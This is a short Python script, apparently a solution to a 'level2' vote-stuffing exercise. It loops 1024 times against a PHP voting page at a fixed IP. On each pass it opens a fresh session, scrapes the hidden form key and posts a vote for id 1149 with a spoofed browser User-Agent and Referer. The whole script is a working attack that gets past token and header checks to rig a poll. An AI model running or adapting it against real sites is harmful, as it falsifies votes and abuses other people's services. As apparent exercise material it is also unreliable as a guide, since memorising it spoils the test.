#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

php = "http://158.69.76.135/level2.php"
user_agent = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) "
              "Gecko/20100101 Firefox/64.0")
Reference = {"User-Agent": user_agent, "referer": php}
IdVote = {"id": "1149", "holdthedoor": "Submit","key": ""}

if __name__ == "__main__":
    for i in range(0, 1024):
        session = requests.session()
        Website = session.get(php, headers=Reference)
        MySoup = BeautifulSoup(Website.text, "html.parser")
        hidden_value = MySoup.find("form", {"method": "post"})
        hidden_value = hidden_value.find("input", {"type": "hidden"})
        IdVote["key"] = hidden_value["value"]
        session.post(php, headers=Reference, data=IdVote)
